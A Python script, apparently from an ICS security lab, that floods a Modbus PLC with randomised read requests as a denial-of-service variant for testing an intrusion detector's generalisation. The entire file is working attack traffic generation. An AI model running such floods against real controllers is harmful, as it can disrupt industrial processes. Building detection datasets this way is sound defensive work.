#!/usr/bin/env python3
"""
Query-flooding / DoS -- VARIANT implementation (for generalisation testing).

Different code from modbus_flood.py: instead of repeating ONE fixed read, this
floods the PLC with RANDOMISED requests -- varied addresses and counts, and a
mix of read-coils / read-holding-registers -- as fast as a single connection can.
Same attack class (high-rate query flood), different code and traffic mix; used
to test whether the detector generalises to a variant it never trained on.

Usage:  python3 modbus_flood2.py [host] [port] [duration] [rate_qps]
        defaults: openplc 502 15 200   (rate capped so it stresses without crashing)
"""
import sys, time, random
from pymodbus.client import ModbusTcpClient

HOST = sys.argv[1] if len(sys.argv) > 1 else "openplc"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 502
DUR  = float(sys.argv[3]) if len(sys.argv) > 3 else 15.0
RATE = float(sys.argv[4]) if len(sys.argv) > 4 else 200.0

c = ModbusTcpClient(HOST, port=PORT)
if not c.connect():
    print(f"[!] could not connect to {HOST}:{PORT}")
    sys.exit(1)

interval = 1.0 / RATE if RATE > 0 else 0.0
print(f"[*] VARIANT flood on {HOST}:{PORT} for {DUR:.0f}s at ~{RATE:.0f} q/s (randomised mixed reads)...")
n = 0
t0 = time.time()
nxt = t0
while time.time() - t0 < DUR:
    addr = random.randint(0, 100)
    cnt = random.randint(1, 20)
    if random.random() < 0.5:
        c.read_holding_registers(addr, count=cnt)
    else:
        c.read_coils(addr, count=cnt)
    n += 1
    if interval:
        nxt += interval
        slp = nxt - time.time()
        if slp > 0:
            time.sleep(slp)
c.close()

dt = time.time() - t0
print(f"[*] Sent {n} queries in {dt:.1f}s = {n/dt:.0f} q/s")
print("[*] Done -- variant query flood complete.")
